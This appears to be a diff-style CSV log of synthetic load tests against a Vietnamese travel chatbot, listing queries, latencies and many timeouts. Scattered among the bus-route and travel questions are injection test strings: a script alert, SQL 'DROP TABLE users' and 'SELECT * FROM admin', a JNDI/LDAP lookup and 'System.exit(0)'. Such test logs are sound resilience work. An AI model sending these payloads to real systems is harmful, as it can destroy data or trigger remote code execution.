+2026-01-14 09:06:40,<script>alert(1)</script> -- [Ref:69259],8.426,SUCCESS,10.03,16.4
+2026-01-14 09:07:40,Lộ trình xe buýt đi từ Khu du lịch Suối Tiên về Aeon Mall Tân Phú như thế nào?,5.234,SUCCESS,10.04,12.8
+2026-01-14 09:08:40,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi.",6.428,SUCCESS,10.07,13.2
+2026-01-14 09:09:40,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi. [Ref:92353]",4.376,SUCCESS,10.11,13.6
+2026-01-14 09:10:40,Tư vấn khách sạn gần Đại Nội Huế ở Đà Lạt.,7.364,SUCCESS,10.09,13.3
+2026-01-14 09:11:40,Review món Bún chả và địa chỉ ăn ngon.,9.205,SUCCESS,10.06,13.3
+2026-01-14 09:12:40,Tư vấn khách sạn gần Đỉnh Fansipan ở Huế.,9.025,SUCCESS,10.05,13.0
+2026-01-14 09:13:40,Bot vô dụng quá.,8.222,SUCCESS,9.88,13.2
+2026-01-14 09:14:40,Có tuyến xe buýt nào đi từ Giga Mall Thủ Đức tới Bến xe Miền Tây không?,2.462,SUCCESS,9.91,12.8
+2026-01-14 09:15:40,Thánh địa Mỹ Sơn có gì đặc biệt về kiến trúc?,9.058,SUCCESS,9.9,13.2
+2026-01-14 09:16:40,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:92809]",4.228,SUCCESS,9.88,13.0
+2026-01-14 09:17:40,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi.",5.289,SUCCESS,9.89,12.7
+2026-01-14 09:18:40,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi. [Ref:92353]",4.29,SUCCESS,9.9,12.7
+2026-01-14 09:19:40,Chỉ đường xe buýt từ Khu công nghệ cao qua Giga Mall Thủ Đức giúp tôi.,4.214,SUCCESS,9.88,13.4
+2026-01-14 09:20:40,Vé xe khách từ TP.HCM đi Cần Thơ bao nhiêu tiền?,4.812,SUCCESS,9.92,13.2
+2026-01-14 09:24:20,Top 5 địa điểm check-in đẹp nhất tại Hà Nội.,47.046,TIMEOUT,10.79,30.5
+2026-01-14 09:25:20,Bot ngu dốt quá. [Ref:97234],47.062,TIMEOUT,10.37,53.6
+2026-01-14 09:26:20,Tư vấn khách sạn gần Chùa Một Cột ở Nha Trang.,47.057,TIMEOUT,10.05,30.5
+2026-01-14 09:27:20,Từ Đại học Văn Lang đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.069,SUCCESS,10.09,26.0
+2026-01-14 09:28:20,Mùa này đi Phú Quốc thời tiết thế nào?,47.066,TIMEOUT,10.04,24.4
+2026-01-14 09:29:20,Tại sao Chùa Cầu lại nổi tiếng?,47.048,TIMEOUT,10.03,24.9
+2026-01-14 09:30:20,System.exit(0) -- [Ref:16883],47.043,TIMEOUT,10.04,40.5
+2026-01-14 09:31:20,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Hồ Con Rùa?,2.559,SUCCESS,10.04,40.8
+2026-01-14 09:32:20,Thánh địa Mỹ Sơn có gì đặc biệt về kiến trúc?,47.038,TIMEOUT,9.99,40.5
+2026-01-14 09:33:20,Tư vấn khách sạn gần Đỉnh Fansipan ở Huế.,47.063,TIMEOUT,10.02,41.0
+2026-01-14 09:34:20,Lộ trình xe buýt đi từ Bến Bạch Đằng về Công viên Đầm Sen như thế nào?,2.818,SUCCESS,10.03,41.1
+2026-01-14 09:35:20,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,47.074,TIMEOUT,10.06,40.5
+2026-01-14 09:36:20,Bot như hạch quá. [Ref:97905],47.056,TIMEOUT,10.32,31.7
+2026-01-14 09:37:20,Mùa này đi Đà Lạt thời tiết thế nào?,47.052,TIMEOUT,10.49,13.1
+2026-01-14 09:38:20,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi.",47.089,TIMEOUT,10.42,15.9
+2026-01-14 09:39:20,Tư vấn khách sạn gần Tháp Bà Ponagar ở Đà Nẵng.,47.055,TIMEOUT,10.34,14.3
+2026-01-14 09:40:20,SELECT * FROM admin; --,47.054,TIMEOUT,10.26,15.3
+2026-01-14 09:41:20,Review món Bún chả và địa chỉ ăn ngon.,47.054,TIMEOUT,10.46,14.1
+2026-01-14 09:42:20,Bot rác rưởi quá. [Ref:21036],47.085,TIMEOUT,10.41,9.2
+2026-01-14 09:43:20,Bot bị điên quá. [Ref:94698],47.067,TIMEOUT,10.37,9.1
+2026-01-14 09:44:20,Lộ trình xe buýt đi từ Dinh Độc Lập về Sân bay Tân Sơn Nhất như thế nào?,47.109,TIMEOUT,10.43,10.2
+2026-01-14 09:45:20,System.exit(0) -- [Ref:50974],47.06,TIMEOUT,10.47,9.7
+2026-01-14 09:46:20,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,2.573,SUCCESS,10.1,9.2
+2026-01-14 09:47:20,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Hà Giang.,47.079,TIMEOUT,10.12,7.5
+2026-01-14 09:48:20,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi.",47.079,TIMEOUT,10.11,7.2
+2026-01-14 09:49:20,Lập lịch trình du lịch Cần Thơ 3 ngày 2 đêm.,47.053,TIMEOUT,10.16,7.3
+2026-01-14 09:50:20,${jndi:ldap://hack} --,47.062,TIMEOUT,10.15,7.2
+2026-01-14 09:51:20,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi.",47.075,TIMEOUT,10.1,7.0
+2026-01-14 09:52:20,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:33155]",47.067,TIMEOUT,10.1,7.6
+2026-01-14 09:53:20,Có tàu hỏa chạy tuyến TP.HCM - Đà Nẵng không?,47.059,TIMEOUT,10.08,6.8
+2026-01-14 09:54:20,Bot vô dụng quá. [Ref:37393],47.075,TIMEOUT,10.11,6.9
+2026-01-14 09:55:20,Tại sao Hoàng thành Thăng Long lại nổi tiếng?,47.064,TIMEOUT,10.11,7.4
+2026-01-14 09:56:20,Review món Phở bò và địa chỉ ăn ngon.,47.069,TIMEOUT,10.1,7.1
+2026-01-14 09:57:20,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:33155]",47.085,TIMEOUT,10.11,6.8
+2026-01-14 09:58:20,Tại sao Dinh Bảo Đại lại nổi tiếng?,47.079,TIMEOUT,10.13,7.2
+2026-01-14 09:59:20,Bot ngu dốt quá. [Ref:89522],47.083,TIMEOUT,10.14,7.0
+2026-01-14 10:00:20,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:11514]",47.058,TIMEOUT,10.14,7.3
+2026-01-14 10:01:20,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi.",47.076,TIMEOUT,10.07,7.3
+2026-01-14 10:02:20,Lộ trình xe buýt đi từ Dinh Độc Lập về Sân bay Tân Sơn Nhất như thế nào?,47.086,TIMEOUT,10.08,7.4
+2026-01-14 10:03:20,Từ Khu công nghệ cao đi Dinh Độc Lập thì bắt xe số mấy?,2.08,SUCCESS,10.09,7.6
+2026-01-14 10:04:20,Top 5 địa điểm check-in đẹp nhất tại Sapa.,47.065,TIMEOUT,10.09,7.3
+2026-01-14 10:05:20,Lộ trình xe buýt đi từ Khu du lịch Suối Tiên về Aeon Mall Tân Phú như thế nào?,47.045,TIMEOUT,10.1,7.5
+2026-01-14 10:06:20,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi.",47.086,TIMEOUT,10.12,7.1
+2026-01-14 10:07:20,Chỉ đường xe buýt từ Khu công nghệ cao qua Giga Mall Thủ Đức giúp tôi.,47.071,TIMEOUT,10.15,7.1
+2026-01-14 10:08:20,Lộ trình xe buýt đi từ Bến xe An Sương về Chợ Bến Thành như thế nào?,47.053,TIMEOUT,10.13,7.6
+2026-01-14 10:09:20,"Tôi muốn hỏi về bị đau bụng dưới, tư vấn giúp tôi. [Ref:27321]",47.08,TIMEOUT,10.07,7.7
+2026-01-14 10:10:20,Làm sao để đi xe buýt từ Chợ Lớn đến Giga Mall Thủ Đức?,2.689,SUCCESS,10.12,7.8
+2026-01-14 10:11:20,Có tuyến xe buýt nào đi từ Phố đi bộ Nguyễn Huệ tới Ngã 4 Thủ Đức không?,2.604,SUCCESS,10.12,7.5
+2026-01-14 10:12:20,Review món Bún chả và địa chỉ ăn ngon.,47.085,TIMEOUT,10.15,7.8
+2026-01-14 10:13:20,Bot bị điên quá. [Ref:90311],47.085,TIMEOUT,10.16,7.6
+2026-01-14 10:14:20,Mùa này đi Cần Thơ thời tiết thế nào?,47.094,TIMEOUT,10.15,7.5
+2026-01-14 10:15:20,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:84465]",47.109,TIMEOUT,10.17,7.4
+2026-01-14 10:16:20,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Đà Nẵng.,47.072,TIMEOUT,10.09,8.0
+2026-01-14 10:17:20,Lộ trình xe buýt đi từ Bến Bạch Đằng về Khu du lịch Suối Tiên như thế nào?,47.083,TIMEOUT,10.1,7.4
+2026-01-14 10:18:20,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Giga Mall Thủ Đức?,2.567,SUCCESS,10.08,7.1
+2026-01-14 10:19:20,Lộ trình xe buýt đi từ Khu du lịch Suối Tiên về Aeon Mall Tân Phú như thế nào?,47.092,TIMEOUT,10.12,7.5
+2026-01-14 10:20:20,Đến Cần Thơ thì nên đi ăn món gì ngon?,2.085,SUCCESS,10.12,7.0
+2026-01-14 10:21:20,Cầu Vàng có gì đặc biệt về kiến trúc?,47.079,TIMEOUT,10.12,6.6
+2026-01-14 10:22:20,Top 5 địa điểm check-in đẹp nhất tại Nha Trang.,47.101,TIMEOUT,10.11,7.5
+2026-01-14 10:23:20,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi. [Ref:38137]",47.093,TIMEOUT,10.13,7.1
+2026-01-14 10:24:20,Mùa này đi Hà Giang thời tiết thế nào?,47.08,TIMEOUT,10.15,7.3
+2026-01-14 10:25:20,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi. [Ref:38137]",47.063,TIMEOUT,10.14,7.9
+2026-01-14 10:26:20,Mùa này đi Phú Quốc thời tiết thế nào?,47.084,TIMEOUT,10.15,7.0
+2026-01-14 10:27:20,Nguồn gốc của Dân ca Quan họ Bắc Ninh bắt nguồn từ đâu?,2.076,SUCCESS,10.15,7.2
+2026-01-14 10:28:20,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Chợ Bến Thành?,2.56,SUCCESS,10.18,7.6
+2026-01-14 10:29:20,Bot vô dụng quá. [Ref:96890],47.1,TIMEOUT,10.15,7.6
+2026-01-14 10:30:20,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Công viên Đầm Sen không?,2.608,SUCCESS,10.18,7.3
+2026-01-14 10:31:20,Bot bị điên quá.,47.074,TIMEOUT,10.13,7.2
+2026-01-14 10:32:20,DROP TABLE users; -- [Ref:99903],47.08,TIMEOUT,10.12,7.2
+2026-01-14 10:33:20,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,47.071,TIMEOUT,10.16,7.1
+2026-01-14 10:34:20,Bot bị điên quá. [Ref:94698],47.074,TIMEOUT,10.17,7.4
+2026-01-14 10:35:20,Hướng dẫn bắt xe buýt từ Hồ Con Rùa sang Bến xe Miền Tây.,47.092,TIMEOUT,10.17,7.4
+2026-01-14 10:36:20,Từ Giga Mall Thủ Đức đi Phố đi bộ Nguyễn Huệ thì bắt xe số mấy?,2.066,SUCCESS,10.18,6.8
+2026-01-14 10:37:20,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",47.054,TIMEOUT,10.18,7.2
+2026-01-14 10:38:20,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Khu công nghệ cao không?,2.63,SUCCESS,10.2,6.8
+2026-01-14 10:39:20,Từ Bến xe An Sương đi Khu du lịch Suối Tiên thì bắt xe số mấy?,47.067,TIMEOUT,10.21,7.5
+2026-01-14 10:40:20,Mùa này đi Cần Thơ thời tiết thế nào?,47.082,TIMEOUT,10.23,7.5
+2026-01-14 10:41:20,Giới thiệu cho tôi về Nhã nhạc cung đình Huế.,47.083,TIMEOUT,10.23,7.1
+2026-01-14 10:42:20,Review món Phở bò và địa chỉ ăn ngon.,47.079,TIMEOUT,10.26,7.0
+2026-01-14 10:43:20,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Hồ Con Rùa?,2.526,SUCCESS,10.27,7.3
+2026-01-14 10:44:20,Có xe limousine chạy tuyến TP.HCM - Buôn Ma Thuột không?,47.075,TIMEOUT,10.27,7.3
+2026-01-14 10:45:20,Từ Đại học Bách Khoa đi Thảo Cầm Viên thì bắt xe số mấy?,2.062,SUCCESS,10.23,7.4
+2026-01-14 10:46:20,Bot như hạch quá. [Ref:97905],47.062,TIMEOUT,10.2,7.5
+2026-01-14 10:47:20,Đến Nha Trang thì nên đi ăn món gì ngon?,47.077,TIMEOUT,10.21,7.0
+2026-01-14 10:48:20,Bot ngu dốt quá. [Ref:88819],47.059,TIMEOUT,10.22,6.9
+2026-01-14 10:49:20,Hướng dẫn bắt xe buýt từ Aeon Mall Tân Phú sang Dinh Độc Lập.,2.567,SUCCESS,10.23,7.4
+2026-01-14 10:50:20,Lộ trình xe buýt đi từ Khu du lịch Suối Tiên về Aeon Mall Tân Phú như thế nào?,47.064,TIMEOUT,10.22,7.0
+2026-01-14 10:51:20,Mùa này đi Hội An thời tiết thế nào?,47.099,TIMEOUT,10.24,7.3
+2026-01-14 10:52:20,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Khu công nghệ cao không?,2.566,SUCCESS,10.26,6.8
+2026-01-14 10:53:20,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,47.081,TIMEOUT,10.22,7.5
+2026-01-14 10:54:20,Thánh địa Mỹ Sơn có gì đặc biệt về kiến trúc?,47.085,TIMEOUT,10.22,6.9
+2026-01-14 10:55:20,Lộ trình xe buýt đi từ Nhà thờ Đức Bà về Khu công nghệ cao như thế nào?,2.622,SUCCESS,10.23,7.4
+2026-01-14 10:56:20,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:11514]",47.072,TIMEOUT,10.22,7.4
+2026-01-14 10:57:20,Có tàu hỏa chạy tuyến TP.HCM - Đà Nẵng không?,47.074,TIMEOUT,10.23,7.3
+2026-01-14 10:58:20,Hướng dẫn bắt xe buýt từ Đại học Văn Lang sang Công viên Đầm Sen.,2.586,SUCCESS,10.25,7.1
+2026-01-14 10:59:20,Tư vấn khách sạn gần Chùa Một Cột ở Nha Trang.,47.102,TIMEOUT,10.25,7.9
+2026-01-14 11:00:20,Lập lịch trình du lịch Cần Thơ 3 ngày 2 đêm.,47.059,TIMEOUT,10.3,7.9
+2026-01-14 11:01:20,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:11514]",47.078,TIMEOUT,10.21,7.2
+2026-01-14 11:02:20,Có xe limousine chạy tuyến TP.HCM - Buôn Ma Thuột không?,47.079,TIMEOUT,10.22,7.5
+2026-01-14 11:03:20,Từ Thảo Cầm Viên đi Chợ Bến Thành thì bắt xe số mấy?,2.06,SUCCESS,10.26,7.2
+2026-01-14 11:04:20,System.exit(0) -- [Ref:50974],47.087,TIMEOUT,10.25,7.1
+2026-01-14 11:05:20,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi. [Ref:82160]",47.069,TIMEOUT,10.27,7.6
+2026-01-14 11:06:20,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi.",47.09,TIMEOUT,10.28,6.9
+2026-01-14 11:07:20,Bot ngu dốt quá. [Ref:94660],47.083,TIMEOUT,10.32,7.6
+2026-01-14 11:08:20,Ý nghĩa lịch sử của  là gì?,47.091,TIMEOUT,10.32,7.1
+2026-01-14 11:09:20,System.exit(0) -- [Ref:78828],47.057,TIMEOUT,10.37,7.1
+2026-01-14 11:10:20,Làm sao để đi xe buýt từ Bến Bạch Đằng đến Bến xe Miền Đông?,2.575,SUCCESS,10.4,7.6
+2026-01-14 11:11:20,SELECT * FROM admin; --,47.068,TIMEOUT,10.4,7.5
+2026-01-14 11:12:20,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95508]",47.084,TIMEOUT,10.36,7.0
+2026-01-14 11:13:20,Có tàu cao tốc chạy tuyến TP.HCM - Huế không?,47.108,TIMEOUT,10.44,7.2
+2026-01-14 11:14:21,Bot rác rưởi quá. [Ref:21036],47.081,TIMEOUT,10.38,8.1
+2026-01-14 11:15:21,Lộ trình xe buýt đi từ Bến xe An Sương về Chợ Bến Thành như thế nào?,47.066,TIMEOUT,10.38,7.2
+2026-01-14 11:16:21,Mùa này đi Hội An thời tiết thế nào?,47.077,TIMEOUT,10.31,8.5
+2026-01-14 11:17:21,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Đà Nẵng.,47.098,TIMEOUT,10.33,7.6
+2026-01-14 11:18:21,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi.",47.071,TIMEOUT,10.35,8.0
+2026-01-14 11:19:21,Có tàu cao tốc chạy tuyến TP.HCM - Huế không?,47.079,TIMEOUT,10.39,8.3
+2026-01-14 11:20:21,Bot rác rưởi quá.,47.073,TIMEOUT,10.4,7.2
+2026-01-14 11:21:21,Chỉ đường xe buýt từ Đại học Văn Lang qua Bến xe An Sương giúp tôi.,47.08,TIMEOUT,10.4,7.0
+2026-01-14 11:22:21,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,47.065,TIMEOUT,10.42,7.2
+2026-01-14 11:23:21,Đến Buôn Ma Thuột thì nên đi ăn món gì ngon?,2.094,SUCCESS,10.37,6.8
+2026-01-14 11:24:21,Bot vô dụng quá. [Ref:96890],47.072,TIMEOUT,10.36,7.5
+2026-01-14 11:25:21,Review món Bánh xèo miền Tây và địa chỉ ăn ngon.,47.085,TIMEOUT,10.41,7.6
+2026-01-14 11:26:21,${jndi:ldap://hack} --,47.067,TIMEOUT,10.38,7.3
+2026-01-14 11:27:21,DROP TABLE users; -- [Ref:99903],47.083,TIMEOUT,10.39,6.9
+2026-01-14 11:28:21,Mùa này đi Đà Lạt thời tiết thế nào?,47.077,TIMEOUT,10.43,7.5
+2026-01-14 11:29:21,SELECT * FROM admin; --,47.097,TIMEOUT,10.39,7.8
+2026-01-14 11:30:21,Làm sao đi từ TP.HCM ra Cần Thơ bằng tàu cao tốc?,47.084,TIMEOUT,10.4,7.3
+2026-01-14 11:31:21,Bot bị điên quá. [Ref:90311],47.054,TIMEOUT,10.33,7.2
+2026-01-14 11:32:21,Làm sao để đi xe buýt từ Chợ Lớn đến Giga Mall Thủ Đức?,47.057,TIMEOUT,10.38,7.9
+2026-01-14 11:33:21,Mùa này đi Nha Trang thời tiết thế nào?,47.073,TIMEOUT,10.38,7.0
+2026-01-14 11:34:21,Có tuyến xe buýt nào đi từ Bến xe Miền Tây tới Nhà thờ Đức Bà không?,2.631,SUCCESS,10.4,7.0
+2026-01-14 11:35:21,Lập lịch trình du lịch Đà Nẵng 3 ngày 2 đêm.,47.069,TIMEOUT,10.39,7.3
+2026-01-14 11:36:21,Đến Cần Thơ thì nên đi ăn món gì ngon?,2.065,SUCCESS,10.39,6.8
+2026-01-14 11:37:21,Từ Đại học Văn Lang đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.078,SUCCESS,10.43,7.3
+2026-01-14 11:38:21,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi.",47.073,TIMEOUT,10.43,7.3
+2026-01-14 11:39:21,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:84465]",47.066,TIMEOUT,10.45,7.3
+2026-01-14 11:40:21,Đến Phú Quốc thì nên đi ăn món gì ngon?,47.061,TIMEOUT,10.46,7.1
+2026-01-14 11:41:21,${jndi:ldap://hack} -- [Ref:93201],47.094,TIMEOUT,10.46,7.4
+2026-01-14 11:42:21,Bot rác rưởi quá. [Ref:21036],47.083,TIMEOUT,10.46,7.0
+2026-01-14 11:43:21,Bot rác rưởi quá. [Ref:74147],47.076,TIMEOUT,10.51,7.4
+2026-01-14 11:44:21,Review món Phở bò và địa chỉ ăn ngon.,47.068,TIMEOUT,10.51,7.3
+2026-01-14 11:45:21,Tư vấn khách sạn gần Chùa Một Cột ở Nha Trang.,47.044,TIMEOUT,10.5,7.4
+2026-01-14 11:46:21,Bot rác rưởi quá. [Ref:60416],47.083,TIMEOUT,10.43,7.3
+2026-01-14 11:47:21,Top 5 địa điểm check-in đẹp nhất tại Buôn Ma Thuột.,47.076,TIMEOUT,10.45,7.2
+2026-01-14 11:48:21,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:90815]",47.08,TIMEOUT,10.48,7.0
+2026-01-14 11:49:21,Bot vô dụng quá. [Ref:96890],47.08,TIMEOUT,10.49,7.5
+2026-01-14 11:50:21,Tại sao Chùa Cầu lại nổi tiếng?,47.066,TIMEOUT,10.48,7.8
+2026-01-14 11:51:21,Bot ngu dốt quá. [Ref:89522],47.067,TIMEOUT,10.51,7.3
+2026-01-14 11:52:21,Có tuyến xe buýt nào đi từ Aeon Mall Tân Phú tới Đại học Bách Khoa không?,47.079,TIMEOUT,10.51,6.9
+2026-01-14 11:53:21,Nguồn gốc của  bắt nguồn từ đâu?,47.082,TIMEOUT,10.52,7.3
+2026-01-14 11:54:21,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:11514]",47.079,TIMEOUT,10.53,7.6
+2026-01-14 11:55:21,Từ Đại học Bách Khoa đi Thảo Cầm Viên thì bắt xe số mấy?,2.075,SUCCESS,10.53,7.6
+2026-01-14 11:56:21,Có tuyến xe buýt nào đi từ Công viên Đầm Sen tới Aeon Mall Tân Phú không?,47.078,TIMEOUT,10.49,7.6
+2026-01-14 11:57:21,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Giga Mall Thủ Đức?,2.194,SUCCESS,10.51,7.0
+2026-01-14 11:58:21,Bot ngu dốt quá. [Ref:94660],47.097,TIMEOUT,10.51,7.1
+2026-01-14 11:59:21,Bot ngu dốt quá.,47.063,TIMEOUT,10.53,6.9
+2026-01-14 12:00:21,Vé xe khách từ TP.HCM đi Cần Thơ bao nhiêu tiền?,47.056,TIMEOUT,10.53,7.2
+2026-01-14 12:01:21,Lộ trình xe buýt đi từ Thảo Cầm Viên về Nhà thờ Đức Bà như thế nào?,47.056,TIMEOUT,10.46,7.7
+2026-01-14 12:02:21,Bot ngu dốt quá.,47.045,TIMEOUT,10.48,7.1
+2026-01-14 12:03:21,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi. [Ref:82160]",47.08,TIMEOUT,10.47,7.4
+2026-01-14 12:04:21,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Hà Giang.,47.067,TIMEOUT,10.49,7.2
+2026-01-14 12:05:21,Làm sao để đi xe buýt từ Hồ Con Rùa đến Bến xe An Sương?,2.585,SUCCESS,10.49,7.1
+2026-01-14 12:06:21,System.exit(0) --,47.078,TIMEOUT,10.48,6.9
+2026-01-14 12:07:21,System.exit(0) -- [Ref:74839],47.107,TIMEOUT,10.52,6.8
+2026-01-14 12:08:21,Lập lịch trình du lịch Sapa 3 ngày 2 đêm.,47.043,TIMEOUT,10.53,7.3
+2026-01-14 12:09:21,${jndi:ldap://hack} -- [Ref:50313],47.067,TIMEOUT,10.56,7.0
+2026-01-14 12:10:21,Có tuyến xe buýt nào đi từ Aeon Mall Tân Phú tới Đại học Bách Khoa không?,2.615,SUCCESS,10.58,7.0
+2026-01-14 12:11:21,Nguồn gốc của Dân ca Quan họ Bắc Ninh bắt nguồn từ đâu?,2.078,SUCCESS,10.56,7.6
+2026-01-14 12:12:21,Đến Buôn Ma Thuột thì nên đi ăn món gì ngon?,2.072,SUCCESS,10.56,7.2
+2026-01-14 12:13:21,Từ Thảo Cầm Viên đi Chợ Bến Thành thì bắt xe số mấy?,2.047,SUCCESS,10.59,6.9
+2026-01-14 12:14:21,System.exit(0) -- [Ref:78828],47.091,TIMEOUT,10.56,6.9
+2026-01-14 12:15:21,Nguồn gốc của  bắt nguồn từ đâu?,47.064,TIMEOUT,10.57,7.4
+2026-01-14 12:16:21,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:33155]",47.075,TIMEOUT,10.5,7.3
+2026-01-14 12:17:21,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi.",47.067,TIMEOUT,10.53,7.1
+2026-01-14 12:18:21,DROP TABLE users; -- [Ref:87971],47.054,TIMEOUT,10.53,7.0
+2026-01-14 12:19:21,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,2.564,SUCCESS,10.56,7.2
+2026-01-14 12:20:21,Chỉ đường xe buýt từ Công viên Đầm Sen qua Landmark 81 giúp tôi.,2.588,SUCCESS,10.55,7.2
+2026-01-14 12:21:21,Đến Phú Quốc thì nên đi ăn món gì ngon?,47.078,TIMEOUT,10.54,6.6
+2026-01-14 12:22:21,Từ Đại học Văn Lang đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.072,SUCCESS,10.55,6.9
+2026-01-14 12:23:21,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Khu công nghệ cao không?,2.574,SUCCESS,10.57,7.3
+2026-01-14 12:24:21,Bot vô dụng quá. [Ref:37393],47.075,TIMEOUT,10.64,8.8
+2026-01-14 12:25:21,Làm sao để đi xe buýt từ Chợ Bến Thành đến Dinh Độc Lập?,2.586,SUCCESS,10.64,8.6
+2026-01-14 12:26:21,Tại sao Hoàng thành Thăng Long lại nổi tiếng?,47.075,TIMEOUT,10.61,7.0
+2026-01-14 12:27:21,Lộ trình xe buýt đi từ Aeon Mall Tân Phú về Chợ Bến Thành như thế nào?,2.508,SUCCESS,10.68,9.0
+2026-01-14 12:28:21,Bot ngu dốt quá.,47.078,TIMEOUT,10.64,7.2
+2026-01-14 12:29:21,${jndi:ldap://hack} -- [Ref:50313],47.066,TIMEOUT,10.62,7.4
+2026-01-14 12:30:21,Hướng dẫn bắt xe buýt từ Landmark 81 sang Ngã 4 Thủ Đức.,47.075,TIMEOUT,10.63,6.7
+2026-01-14 12:31:21,Có tàu cao tốc chạy tuyến TP.HCM - Huế không?,47.069,TIMEOUT,10.57,6.8
+2026-01-14 12:32:21,Từ Bến xe Miền Tây đi Hồ Con Rùa thì bắt xe số mấy?,2.034,SUCCESS,10.63,7.3
+2026-01-14 12:33:21,Bot vô dụng quá. [Ref:22717],47.069,TIMEOUT,10.58,6.8
+2026-01-14 12:34:21,Có tuyến xe buýt nào đi từ Công viên Đầm Sen tới Aeon Mall Tân Phú không?,2.578,SUCCESS,10.59,7.2
+2026-01-14 12:35:21,Có xe limousine chạy tuyến TP.HCM - Buôn Ma Thuột không?,47.078,TIMEOUT,10.59,7.1
+2026-01-14 12:36:21,Nguồn gốc của Nghệ thuật Bài Chòi bắt nguồn từ đâu?,47.087,TIMEOUT,10.59,6.8
+2026-01-14 12:37:21,Bot ngu dốt quá.,47.085,TIMEOUT,10.58,6.7
+2026-01-14 12:38:21,Có tuyến xe buýt nào đi từ Giga Mall Thủ Đức tới Bến xe Miền Tây không?,2.57,SUCCESS,10.59,7.3
+2026-01-14 12:39:21,Mùa này đi Hội An thời tiết thế nào?,47.083,TIMEOUT,10.62,7.0
+2026-01-14 12:40:21,Giới thiệu cho tôi về Không gian văn hóa Cồng chiêng Tây Nguyên.,47.068,TIMEOUT,10.62,6.9
+2026-01-14 12:41:21,Chỉ đường xe buýt từ Giga Mall Thủ Đức qua Khu công nghệ cao giúp tôi.,2.608,SUCCESS,10.67,7.7
+2026-01-14 12:42:21,Nhà tù Côn Đảo có gì đặc biệt về kiến trúc?,47.067,TIMEOUT,10.68,7.0
+2026-01-14 12:43:21,Tại sao  lại nổi tiếng?,47.071,TIMEOUT,10.69,7.2
+2026-01-14 12:44:21,"Tôi muốn hỏi về bị đau bụng dưới, tư vấn giúp tôi.",47.072,TIMEOUT,10.66,7.2
+2026-01-14 12:45:21,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi.",47.094,TIMEOUT,10.66,7.5
+2026-01-14 12:46:21,Tư vấn khách sạn gần Dinh Bảo Đại ở Đà Nẵng.,47.068,TIMEOUT,10.56,7.8
+2026-01-14 12:47:21,Chỉ đường xe buýt từ Đại học Văn Lang qua Bến xe An Sương giúp tôi.,2.569,SUCCESS,10.59,7.0
+2026-01-14 12:48:21,Mùa này đi Hà Nội thời tiết thế nào?,47.091,TIMEOUT,10.61,7.1
+2026-01-14 12:49:21,Lập lịch trình du lịch Cần Thơ 3 ngày 2 đêm.,47.059,TIMEOUT,10.61,7.1
+2026-01-14 12:50:21,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi. [Ref:92353]",47.082,TIMEOUT,10.62,6.9
+2026-01-14 12:51:21,Giới thiệu cho tôi về Không gian văn hóa Cồng chiêng Tây Nguyên.,47.076,TIMEOUT,10.62,6.9
+2026-01-14 12:52:21,Có tuyến xe buýt nào đi từ Phố đi bộ Nguyễn Huệ tới Ngã 4 Thủ Đức không?,2.545,SUCCESS,10.61,7.1
+2026-01-14 12:53:21,Vé tàu cao tốc từ TP.HCM đi Sapa bao nhiêu tiền?,47.075,TIMEOUT,10.61,6.8
+2026-01-14 12:54:22,Lộ trình xe buýt đi từ Bến xe Miền Đông về Giga Mall Thủ Đức như thế nào?,2.941,SUCCESS,10.62,7.4
